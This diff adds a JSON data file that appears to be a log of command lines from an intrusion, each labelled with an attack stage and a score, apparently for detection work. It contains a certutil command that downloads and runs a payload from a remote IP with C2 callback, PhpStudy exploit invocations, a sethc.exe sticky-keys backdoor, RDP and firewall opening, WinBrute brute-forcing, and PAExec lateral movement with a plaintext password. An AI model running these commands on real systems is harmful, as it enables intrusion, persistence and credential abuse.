@@ -1,0 +1,494 @@
+[
+    {
+        "cmd": "ipconfig",
+        "label": "ipconfig",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "ipconfig",
+        "id": "8d40d4461bb8935b0e783328148798d2"
+    },
+    {
+        "cmd": "\"cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/\\\nagent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:\\\n8443 \"",
+        "label": "\"cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/\\\nagent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:\\\n8443 \"",
+        "stage": "Establish Foothold",
+        "stage_score": "52.6",
+        "id": "7acd487c31c9e4d993187f2c59784e6a"
+    },
+    {
+        "cmd": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "ab389e7fcd9b6064e0fcfdd0bea3e93f"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "42.4",
+        "cmd": "",
+        "raw_cmd": "",
+        "id": "f237e928b509fb6da44887c695c5790d"
+    },
+    {
+        "cmd": "\"cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/\\\nagent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:\\\n8443 \"",
+        "label": "\"cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/\\\nagent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:\\\n8443 \"",
+        "stage": "Establish Foothold",
+        "stage_score": "52.6",
+        "id": "0e82ab1459acc722c0bc228d9de98ee1"
+    },
+    {
+        "cmd": "cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "label": "cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Establish Foothold",
+        "stage_score": "52.6",
+        "raw_cmd": "cmd",
+        "id": "f4106fd012d36c419884c078bfa0d7d8"
+    },
+    {
+        "cmd": "arp  -a",
+        "label": "arp  -a",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "ARP",
+        "id": "8d5876fd1d2342bd981143797153f006"
+    },
+    {
+        "cmd": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "b0e496fea9037828f95de4e56475af09"
+    },
+    {
+        "cmd": "ipconfig",
+        "label": "ipconfig",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "ipconfig",
+        "id": "daecd374f068945e34be31e6b7de1a9d"
+    },
+    {
+        "cmd": "ping  www.baidu.com -c 1",
+        "label": "ping  www.baidu.com -c 1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "PING",
+        "id": "df3823b768e608b4ad4efdd1a2162380"
+    },
+    {
+        "cmd": "whoami",
+        "label": "whoami",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "whoami",
+        "id": "ed943872fded9d22497946e84a54b48c"
+    },
+    {
+        "cmd": "cmd  /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "label": "cmd  /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Establish Foothold",
+        "stage_score": "14.4",
+        "raw_cmd": "cmd",
+        "id": "0e881c511f479048c410c13ed48be35d"
+    },
+    {
+        "cmd": "",
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "14.4",
+        "raw_cmd": "certutil",
+        "id": "77d192d3aa3b53fa32ca4e97fa20733d"
+    },
+    {
+        "cmd": "taskkill  /f /im agent.exe",
+        "label": "taskkill  /f /im agent.exe",
+        "stage": "Establish Foothold",
+        "stage_score": "14.4",
+        "raw_cmd": "taskkill",
+        "id": "ba0c5316e6fa54216acc9110ce3fc5d8"
+    },
+    {
+        "cmd": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "stage": "Establish Foothold",
+        "stage_score": "14.4",
+        "raw_cmd": "conhost",
+        "id": "ff5668a1817970682211c4f6a6185960"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "449.2",
+        "cmd": "",
+        "raw_cmd": "agent",
+        "id": "c88f5ef37edb18c47c1d5d0093d5f886"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "04123a0c0bbbc0b2ded650454ed22d10"
+    },
+    {
+        "cmd": "/c echo end:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "label": "/c echo end:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "0f8a0169d64fc33f1fe3e36a55191779"
+    },
+    {
+        "cmd": "/c del /f /q PhpStudyPoc.py",
+        "label": "/c del /f /q PhpStudyPoc.py",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "19e5ea525891815fa367089bbc2d8c03"
+    },
+    {
+        "cmd": "\"/c del /f /q PAExec.exe\"",
+        "label": "\"/c del /f /q PAExec.exe\"",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "1ab9d0e544961427073a276ee608b822"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/sethc.exe/  /f;REG query / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/sethc.exe/  /f;REG query / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "1bbe83746c4dc7bd98a5b1898d4e97a6"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443/ &apos;",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443/ &apos;",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "224ed451937e268f150946b3ae48c27d"
+    },
+    {
+        "cmd": "/c del /f /q WinBrute.exe &amp;&amp; del /f /q administrator_pass.txt",
+        "label": "/c del /f /q WinBrute.exe &amp;&amp; del /f /q administrator_pass.txt",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "2747d3b948ba7b25711cfa8ece998ff5"
+    },
+    {
+        "cmd": "/c python PhpStudyPoc.py http://121.36.30.176/",
+        "label": "/c python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "34adc0f4600038b5490d2173d0d2e0b1"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "37694d348df6bcce6491d529922d2f52"
+    },
+    {
+        "cmd": "/c PAExec.exe //192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "label": "/c PAExec.exe //192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "3ba7410a631d244ac45b4971d30e57da"
+    },
+    {
+        "cmd": "/c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "label": "/c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "493e9ce98c7ab0a0a699abe7106d09b0"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo end:b7f92752-df34-4b08-9e98-45a3004b94ff",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo end:b7f92752-df34-4b08-9e98-45a3004b94ff",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "5fb8c454b74cd087c9173797e2a28fe8"
+    },
+    {
+        "cmd": "/c echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+        "label": "/c echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "65b6784bf0b757d8dda52d2b7c38db9e"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "6b94ac37e23ec99f6f0b42ec80ba5292"
+    },
+    {
+        "cmd": "/c del /f /q PhpStudyExp2.py",
+        "label": "/c del /f /q PhpStudyExp2.py",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "72a13f545e5dfb5835365609045201a0"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:dbb2f234-101f-4f44-bb97-72263635f506",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo start:dbb2f234-101f-4f44-bb97-72263635f506",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "79e647173fa9f90a3d1824085ed54209"
+    },
+    {
+        "cmd": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "7d93ed06ebe62165a53946755b296419"
+    },
+    {
+        "cmd": "/c del /f /q nbtscan.exe",
+        "label": "/c del /f /q nbtscan.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "7fae21d89b5e159cb4fb979bae23e5f7"
+    },
+    {
+        "cmd": "/c del /f /q PAExec.exe",
+        "label": "/c del /f /q PAExec.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "84d0532fea30425eefa218baae1e0e8c"
+    },
+    {
+        "cmd": "/c WinBrute.exe administrator_pass.txt administrator",
+        "label": "/c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "9aee6c9fc4f7c217da01b791e7079abb"
+    },
+    {
+        "cmd": "/c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "label": "/c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "9cd2d35432282fabcf51c2d73e21ed8b"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:b7f92752-df34-4b08-9e98-45a3004b94ff",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo start:b7f92752-df34-4b08-9e98-45a3004b94ff",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "a5c0daa1992383a1b51018d3a0731f46"
+    },
+    {
+        "cmd": "/c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+        "label": "/c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "b3f928c1b1e9d5436163d15dea380b93"
+    },
+    {
+        "cmd": "/c echo end:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+        "label": "/c echo end:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "b852f346dcf6e1285810808d7a3428bd"
+    },
+    {
+        "cmd": "/c del /f /q PAExec.exe",
+        "label": "/c del /f /q PAExec.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "bb0628124210cb446ee755aa3ecb71ff"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1/ &apos;",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1/ &apos;",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "c21e17ba94c56d084eca6701a20c1aed"
+    },
+    {
+        "cmd": "/c echo end:60039041-7450-46ab-99f6-126b30b91407",
+        "label": "/c echo end:60039041-7450-46ab-99f6-126b30b91407",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "cdb69fb50fe0c7151e97fed988136f74"
+    },
+    {
+        "cmd": "/c echo end:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+        "label": "/c echo end:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "d7b56b6fd0eb9b1d4dc62ef6993fdaf1"
+    },
+    {
+        "cmd": "/c PAExec.exe //192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "label": "/c PAExec.exe //192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "e30a6deee197fdac89189022341f49c7"
+    },
+    {
+        "cmd": "/c echo end:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "label": "/c echo end:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "e8874be025529d42da8b5a5a189178fa"
+    },
+    {
+        "cmd": "/c del /f /q PhpStudyExp2.py",
+        "label": "/c del /f /q PhpStudyExp2.py",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "ef5796fb4e863cfdae647ff52b1cdd5e"
+    },
+    {
+        "cmd": "/c echo start:60039041-7450-46ab-99f6-126b30b91407",
+        "label": "/c echo start:60039041-7450-46ab-99f6-126b30b91407",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "f2f1cb87733bc78e068183316fe3ee21"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo end:dbb2f234-101f-4f44-bb97-72263635f506",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo end:dbb2f234-101f-4f44-bb97-72263635f506",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "powershell",
+        "id": "f5c0147f949c803297be02b4a0ae98f2"
+    },
+    {
+        "cmd": "C:/Windows/system32/reg.exe   query  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe",
+        "label": "C:/Windows/system32/reg.exe   query  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "418af2182596f7b2499803e884692c11"
+    },
+    {
+        "cmd": "C:/Windows/system32/reg.exe   query  HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server",
+        "label": "C:/Windows/system32/reg.exe   query  HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "49e0b760ea287f477dacaf3c04ebb258"
+    },
+    {
+        "cmd": "C:/Windows/system32/reg.exe   add  HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server  /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "label": "C:/Windows/system32/reg.exe   add  HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server  /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "76ae200b0a1a73aecf7a293da7f3552c"
+    },
+    {
+        "cmd": "C:/Windows/system32/reg.exe   ADD  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe  /v Debugger /t REG_SZ /d C:/windows/system32/cmd.exe /f",
+        "label": "C:/Windows/system32/reg.exe   ADD  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe  /v Debugger /t REG_SZ /d C:/windows/system32/cmd.exe /f",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "a6fc5bd669ef2dd46773e348aaa823de"
+    },
+    {
+        "cmd": "C:/Windows/system32/netsh.exe   advfirewall firewall add rule  name=Remote Desktop  dir=in action=allow protocol=TCP localport=3389",
+        "label": "C:/Windows/system32/netsh.exe   advfirewall firewall add rule  name=Remote Desktop  dir=in action=allow protocol=TCP localport=3389",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "netsh",
+        "id": "d37af5adfaa024e539b83e30191fcdec"
+    },
+    {
+        "cmd": "\"nbtscan.exe  192.168.0.244/24\"",
+        "label": "\"nbtscan.exe  192.168.0.244/24\"",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "13.2",
+        "id": "53b7fcdc4bd446a42e1f7b68b0a70626"
+    },
+    {
+        "cmd": "C:/Windows/system32/reg.exe   ADD  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe  /v Debugger /t REG_SZ /d C:/windows/system32/sethc.exe /f",
+        "label": "C:/Windows/system32/reg.exe   ADD  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe  /v Debugger /t REG_SZ /d C:/windows/system32/sethc.exe /f",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "2d4de7fc672e75dcafc44eddc3ba0ea8"
+    },
+    {
+        "cmd": "C:/Windows/system32/reg.exe   query  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe",
+        "label": "C:/Windows/system32/reg.exe   query  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "fcfc065f34be653d80aaa6230a21af13"
+    },
+    {
+        "cmd": "C:/Windows/system32/cmd.exe   /c  python PhpStudyExp2.py http://121.36.30.176/  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "label": "C:/Windows/system32/cmd.exe   /c  python PhpStudyExp2.py http://121.36.30.176/  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "caf4d3e9fc825024591331fbda3e035d"
+    },
+    {
+        "label": "",
+        "stage": "Move Laterally",
+        "stage_score": "50.599999999999994",
+        "cmd": "",
+        "raw_cmd": "PAExec",
+        "id": "4d8ecc01537a5fd45f02cefd2b57c84e"
+    },
+    {
+        "cmd": "WinBrute.exe  administrator_pass.txt administrator",
+        "label": "WinBrute.exe  administrator_pass.txt administrator",
+        "stage": "Escalate Privilege",
+        "stage_score": "8.2",
+        "raw_cmd": "WinBrute",
+        "id": "6082b551cbe7e35fcb30bc6a9d81a48e"
+    },
+    {
+        "cmd": "C:/Windows/system32/cmd.exe   /c  python PhpStudyExp2.py http://121.36.30.176/  whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1",
+        "label": "C:/Windows/system32/cmd.exe   /c  python PhpStudyExp2.py http://121.36.30.176/  whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "d9e6eb83c05eca89983adf15a60c922d"
+    },
+    {
+        "label": "",
+        "stage": "Move Laterally",
+        "stage_score": "50.599999999999994",
+        "cmd": "",
+        "raw_cmd": "PAExec",
+        "id": "7edf352f9fb1500fc7ad04c4e05ec912"
+    }
+]
